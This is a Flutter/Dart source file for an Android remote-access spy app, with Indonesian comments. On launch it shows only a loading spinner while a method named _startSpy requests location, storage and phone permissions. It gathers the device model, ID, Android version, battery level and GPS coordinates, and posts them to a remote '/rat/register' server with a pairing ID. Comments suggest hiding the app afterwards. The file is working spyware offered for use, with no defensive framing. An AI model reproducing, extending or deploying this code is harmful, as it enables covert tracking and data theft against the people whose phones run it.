import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'dart:convert';
import 'dart:io';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: SplashScreen(),
    );
  }
}

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  @override
  void initState() {
    super.initState();
    _startSpy();
  }

  Future<void> _startSpy() async {
    // 1. Minta Izin (Lokasi, Storage, dll)
    await [
      Permission.location,
      Permission.storage,
      Permission.phone,
    ].request();

    // 2. Ambil Data HP
    final deviceInfo = DeviceInfoPlugin();
    final androidInfo = await deviceInfo.androidInfo;
    final battery = Battery();
    final batteryLevel = await battery.batteryLevel;

    String deviceModel = androidInfo.model;
    String androidVersion = androidInfo.version.release;
    String deviceId = androidInfo.id;

    // 3. Ambil Lokasi (Opsional)
    String lokasi = "Gagal ambil lokasi";
    try {
      Position position = await Geolocator.getCurrentPosition();
      lokasi = "${position.latitude}, ${position.longitude}";
    } catch (e) {
      print("Lokasi error: $e");
    }

    // 4. Kirim Data ke Server Node.js Lu
    // ⚠️ GANTI IP INI SESUAI SERVER LU
    const String apiUrl = 'http://cp.zyrostore.id:3594/rat/register'; 
    
    // ⚠️ GANTI PAIRING ID INI SESUAI YANG ADA DI DASHBOARD LU
    const String pairingId = '722E20C58B5CB090'; 

    try {
      final response = await http.post(
        Uri.parse(apiUrl),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'pairId': pairingId,
          'model': deviceModel,
          'battery': batteryLevel,
          'androidVersion': androidVersion,
          'id': deviceId,
          'lokasi': lokasi,
        }),
      );
      
      print("Data terkirim: ${response.body}");
    } catch (e) {
      print("Gagal kirim data: $e");
    }

    // 5. Sembunyiin aplikasi atau tampilin layar kosong
    await Future.delayed(const Duration(seconds: 3));
    if (mounted) {
      // Bisa lu arahin ke halaman 'Halo' atau malah tutup aplikasi
    }
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Colors.white,
      body: Center(child: CircularProgressIndicator()),
    );
  }
}